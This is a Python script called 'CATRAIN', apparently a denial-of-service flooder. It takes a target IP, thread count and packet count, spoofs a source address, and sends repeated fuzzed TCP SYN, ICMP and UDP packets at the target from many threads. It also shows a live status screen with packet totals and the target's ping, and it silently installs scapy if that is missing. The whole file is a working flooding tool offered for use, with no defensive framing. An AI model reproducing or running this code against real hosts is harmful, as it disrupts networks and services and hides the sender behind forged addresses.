from argparse import ArgumentParser as AP 

print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 

import subprocess as s; from sys import exit as sex 

try:
	if b"scapy" not in s.check_output("pip list", shell=True):
		s.call("pip install scapy", shell=True) 
finally: 0 

import argparse as AP

def get_args():
	parser = AP.ArgumentParser(description="Catrain by Queen, Lmaos :3") 
	parser.add_argument("-i", "--ip", type=str, nargs='?', help="Target IP address") 
	parser.add_argument("-c", "--count", type=int, help="Packet run count (3 packets per run)") 
	parser.add_argument("-s", "--srcip", type=str, help="Source IP (default: 192.168.1.2)") 
	parser.add_argument("-t", "--threadcount", type=int, help="Thread count") 
	parser.add_argument("-p", "--showping", type=str, choices=['y', 'n'], help="Show ping (y/n, default: y)") 
	parser.add_argument("-d", "--hidethreads", type=str, choices=['y', 'n'], help="Hide most threads from showing in UI. Recommended for 40+ threads (y/n, default: n)") 
	return parser.parse_args() 

if __name__ == "__main__":
	try:
		args = get_args() 
		if not args.ip: target_ip = input("\t\t\t      IP: ") 
		else: target_ip = args.ip 
		if args.count is None: count = int(input("Packet run count (3 packets per): ")) 
		else: count = args.count 
		if args.threadcount is None: threadcount = int(input("\t\t    Thread count: ")) 
		else: threadcount = args.threadcount 
		srcIp = args.srcip if args.srcip else "192.168.1.2" 
		showp = args.showping if args.showping else "y" 
		hideThreads = args.hidethreads if args.hidethreads else "n" 
	except Exception as e: print(f"\nError: {str(e)}. Type more carefully ffs."); sex() 

rno = [True] * threadcount; rcount = [0] * threadcount 

from scapy.all import IP, TCP, ICMP, UDP, send, fuzz 

def scr(number):
	packetT = IP(dst=target_ip, src=srcIp) / fuzz(TCP(flags='S')) 
	packetI = IP(dst=target_ip, src=srcIp) / ICMP() 
	packetU = IP(dst=target_ip, src=srcIp) / fuzz(UDP()) 
	for i in range(count):
		send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
		rcount[number] += 1 
	rno[number] = False 

from threading import Thread; from time import sleep, time; from os import name as osname; from re import search 

starttime=time() 

threads = [] 
for x in range(threadcount):
	t = Thread(target=scr, args=(x,)); t.start() 
	threads.append(t); print(f"called sub {x+1}") 

while any(rno):
	sleep(0.4) 
	if osname == "nt": s.call("cmd.exe /S /C cls", shell=True) 
	else: s.call("clear", shell=True) 
	elt = int(search(r"\d+", str(time()-starttime)).group(0)) 
	status_lines = [] 
	status_lines.append("THR no. | Running\t| Packets sent\t| Packet run no.") 
	status_lines.append("—" * 56) 
	if hideThreads == "n": 
		for i in range(threadcount): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[i]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
	else: 
		for i in range(min(int(threadcount/25), 10)): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[i]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
	if showp == "y": status_lines.append(
f"\nTarget IP:   {target_ip}\t\tCurrent ping: {str(search(r"Reply from [\d.]+: bytes=\d+ time[=<]?\s*(\d+)\s*ms", str(s.check_output(f"ping {target_ip} -n 1", shell=True))).group(1))}ms") 
	else: status_lines.append(f"\nTarget IP:   {target_ip}") 
	status_lines.append(f"'Source' IP: {srcIp}\t\tTotal packets: {rcount[int(len(rcount)/2+0.9)]*3*threadcount}") 
	if hideThreads == "y": status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s\t\t\tTotal threads: {threadcount}") 
	else: status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s") 
	print("\n".join(status_lines)) 
	sleep(0.1) 

input("\nAll sent~~") 

